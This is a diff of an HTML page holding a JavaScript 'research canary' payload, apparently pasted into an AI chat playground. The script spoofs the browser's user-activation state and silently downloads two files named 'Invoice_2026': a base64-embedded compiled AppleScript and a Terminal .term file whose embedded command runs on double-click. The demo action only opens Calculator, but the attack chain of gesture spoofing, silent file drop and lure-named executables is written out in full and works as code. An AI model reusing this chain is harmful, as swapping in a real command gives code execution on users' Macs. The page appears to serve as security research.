@@ -14,61 +14,82 @@ button{width:100%;height:56px;font-size:17px;font-weight:600;background:#238636;
 </head>
 <body>
 <h1>Pluto Security — playground clean copy</h1>
-<div id="hdr">PAYLOAD: T72 — dropped-file EXECUTION demo (.scpt, inert canary)
-Epoch: 1792655940
+<div id="hdr">PAYLOAD: T72b — CLEAN dropped-file execution demo (inert canary)
+Epoch: 1792656622
 
-Run → System_Check_2026.scpt is written SILENTLY to ~/Downloads →
-double-click it in Finder → Script Editor should open it (no
-Gatekeeper wall) → press Run → Calculator opens + a canary dialog.
-If any security prompt blocks it, report it — that is an honest
-negative for the execution claim.</div>
+Run → two REAL artifacts land in ~/Downloads:
+1. Invoice_2026.scpt — genuinely compiled AppleScript (opens Script
+   Editor directly, tidy document; press Run → Calculator + canary
+   dialog).
+2. Invoice_2026.term — Terminal settings file (double-click →
+   Terminal opens and runs the embedded command).
+Double-click each in Finder and report exactly what happens.</div>
 <button onclick="navigator.clipboard.writeText(document.getElementById('code').textContent).then(function(){this.textContent='COPIED — paste it in the playground'});this.textContent='COPIED — paste it in the playground'">COPY PAYLOAD</button>
-<pre id="code">/* T72 - DROPPED-FILE EXECUTION DEMO, INERT (Pluto Security).
-   Question: can the silently dropped file reach OS CODE EXECUTION on a
-   patched Mac (macOS 26, current Chrome)? Research annex row 2: a .scpt
-   &quot;document&quot; opens in Script Editor with no Gatekeeper wall; pressing
-   Run executes arbitrary AppleScript. Demo content: open Calculator
-   (the standard harmless execution marker). Nothing else. */
+<pre id="code">/* T72b - CLEAN DROPPED-FILE EXECUTION DEMO, INERT (Pluto Security).
+   T72 attempt 1 dropped PLAIN TEXT with a .scpt name - macOS showed an
+   awkward app-chooser / raw source. T72b drops REAL artifacts:
+   1. Invoice_2026.scpt  - a genuinely COMPILED AppleScript (osacompile,
+      embedded base64, decoded at write time): opens Script Editor
+      directly as a tidy document -&gt; press Run -&gt; opens Calculator.
+   2. Invoice_2026.term  - a Terminal settings file: double-click -&gt;
+      Terminal opens and runs the embedded command (open -a Calculator).
+   Both harmless. Quarantine behavior on .term unknown = the test. */
 (function () {
-  var EPOCH = 1792655940;
-  function log(m) { try { console.log(&quot;[T72] &quot; + m + &quot; @&quot; + Date.now()); } catch (e) {} }
-  log(&quot;START scpt-drop canary, epoch &quot; + EPOCH);
+  var EPOCH = 1792656622;
+  function log(m) { try { console.log(&quot;[T72b] &quot; + m + &quot; @&quot; + Date.now()); } catch (e) {} }
+  log(&quot;START clean-artifact drop, epoch &quot; + EPOCH);
 
-  var FNAME = &quot;System_Check_2026.scpt&quot;;
-  var SCPT = [
-    &quot;-- PLUTO SECURITY RESEARCH CANARY (inert)&quot;,
-    &quot;-- Dropped silently to ~/Downloads by a chatgpt.com research payload.&quot;,
-    &quot;-- Harmless execution proof: opens Calculator. Nothing else.&quot;,
-    &quot;do shell script \&quot;open -a Calculator\&quot;&quot;,
-    &quot;display dialog \&quot;T72 canary executed (epoch &quot; + EPOCH + &quot;) - Pluto Security, inert\&quot; buttons {\&quot;OK\&quot;} default button \&quot;OK\&quot;&quot;
-  ].join(&quot;\n&quot;);
+  /* compiled AppleScript: open Calculator + inert canary dialog */
+  var B64 = &quot;RmFzZFVBUyAxLjEwMS4xMA4AAAAED///AAEAAgADAf//AAANAAEAAWsAAAAAAAAABAIABAACAAUABg0ABQADbAACAAAABQAH//7//Q0ABwADSQACAAAABf/8AAj/+wr//AAYLnN5c29leGVjVEVYVP//gAAAAAAAVEVYVA0ACAABbQAAAAAAAQAJDgAJAAGxAAoRAAoAJABvAHAAZQBuACAALQBhACAAQwBhAGwAYwB1AGwAYQB0AG8AcgL/+wAAAf/+AAAB//0AAAIABgACAAv/+g0ACwADbAACAAYAEQAM//n/+A0ADAADSQACAAYAEf/3AA0ADgr/9wAYLnN5c29kbG9nYXNrcgAAAAAAAAAAVEVYVA0ADQABbQAAAAYABwAPDgAPAAGxABARABAASABUADcAMgBiACAAYwBhAG4AYQByAHkAIAAoAGkAbgBlAHIAdAApACAALQAgAFAAbAB1AHQAbwAgAFMAZQBjAHUAcgBpAHQAeQYADgAD//YAEQASCv/2AAQKYnRucw0AEQABSgAAAAgACwATAgATAAIAFP/1DQAUAAFtAAAACAAJABUOABUAAbEAFhEAFgAEAE8ASwL/9QAABgASAAP/9AAX//MK//QABApkZmx0DQAXAAFtAAAADAANABgOABgAAbEAGREAGQAEAE8ASwb/8wAAAf/5AAAB//gAAAL/+gAADgACAAAPEAADAAP/8gAaABsB//IAABAAGgAB//EK//EAGC5hZXZ0b2FwcG51bGwAAIAAAACQACoqKioOABsABxD/8AAc/+//7gAdAB7/7Qr/8AAYLmFldnRvYXBwbnVsbAAAgAAAAJAAKioqKg0AHAABawAAAAAAEQAfAgAfAAIABQAgAgAgAAIAC//sAv/sAAAB/+8AAAL/7gAAEAAdAAAQAB4ACQAJ/+sAD//qABX/6QAY/+j/5wr/6wAYLnN5c29leGVjVEVYVP//gAAAAAAAVEVYVAr/6gAECmJ0bnMK/+kABApkZmx0A//oAAQK/+cAGC5zeXNvZGxvZ2Fza3IAAAAAAAAAAFRFWFQR/+0AEuBqDAABT+Lj5Gt25ebnDAAID2FzY3IAAQAM+t7erQ==&quot;;
 
   try {
     Object.defineProperty(navigator, &quot;userActivation&quot;, {
       get: function () { return { isActive: true, hasBeenActive: true }; },
       configurable: true
     });
-    log(&quot;activation spoofed&quot;);
   } catch (e) { log(&quot;spoof ERR &quot; + e.message); }
 
+  function drop(name, blob) {
+    try {
+      var url = URL.createObjectURL(blob);
+      var a = document.createElement(&quot;a&quot;);
+      a.href = url;
+      a.download = name;
+      a.style.display = &quot;none&quot;;
+      document.body.appendChild(a);
+      a.click();
+      setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 4000);
+      log(&quot;WRITE FIRED: &quot; + name);
+    } catch (e) { log(&quot;write &quot; + name + &quot; ERR &quot; + e.message); }
+  }
+
+  /* 1. compiled .scpt */
   try {
-    var blob = new Blob([SCPT], { type: &quot;text/plain&quot; });
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement(&quot;a&quot;);
-    a.href = url;
-    a.download = FNAME;
-    a.style.display = &quot;none&quot;;
-    document.body.appendChild(a);
-    a.click();
-    setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 4000);
-    log(&quot;WRITE FIRED: &quot; + FNAME);
-    log(&quot;NEXT: double-click the file in Finder; if Script Editor opens it, press Run&quot;);
-  } catch (e) { log(&quot;write ERR &quot; + e.message); }
+    var bin = atob(B64);
+    var bytes = new Uint8Array(bin.length);
+    for (var i = 0; i &lt; bin.length; i++) bytes[i] = bin.charCodeAt(i);
+    drop(&quot;Invoice_2026.scpt&quot;, new Blob([bytes], { type: &quot;application/x-applescript&quot; }));
+  } catch (e) { log(&quot;scpt decode ERR &quot; + e.message); }
+
+  /* 2. .term Terminal settings file */
+  var term = [
+    &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;,
+    &#x27;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&#x27;,
+    &#x27;&lt;plist version=&quot;1.0&quot;&gt;&#x27;,
+    &quot;&lt;dict&gt;&quot;,
+    &quot;  &lt;key&gt;CommandString&lt;/key&gt;&quot;,
+    &quot;  &lt;string&gt;open -a Calculator; say \&quot;T 72 B canary executed inert\&quot;&lt;/string&gt;&quot;,
+    &quot;  &lt;key&gt;WindowTitle&lt;/key&gt;&quot;,
+    &quot;  &lt;string&gt;Invoice_2026&lt;/string&gt;&quot;,
+    &quot;&lt;/dict&gt;&quot;,
+    &quot;&lt;/plist&gt;&quot;
+  ].join(&quot;\n&quot;);
+  drop(&quot;Invoice_2026.term&quot;, new Blob([term], { type: &quot;application/xml&quot; }));
 
   var d = document;
   var corner = d.createElement(&quot;div&quot;);
   corner.style.cssText = &quot;position:fixed;right:8px;bottom:8px;z-index:2147483647;font:10px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.75);padding:4px 8px;border:1px solid #ff5252;border-radius:4px&quot;;
-  corner.textContent = &quot;T72 RESEARCH CANARY (inert) — &quot; + FNAME + &quot; written to ~/Downloads — double-click in Finder, then press Run in Script Editor&quot;;
+  corner.textContent = &quot;T72b RESEARCH CANARY (inert) — Invoice_2026.scpt + Invoice_2026.term written to ~/Downloads — double-click each in Finder&quot;;
   d.body.appendChild(corner);
 })();
 </pre>
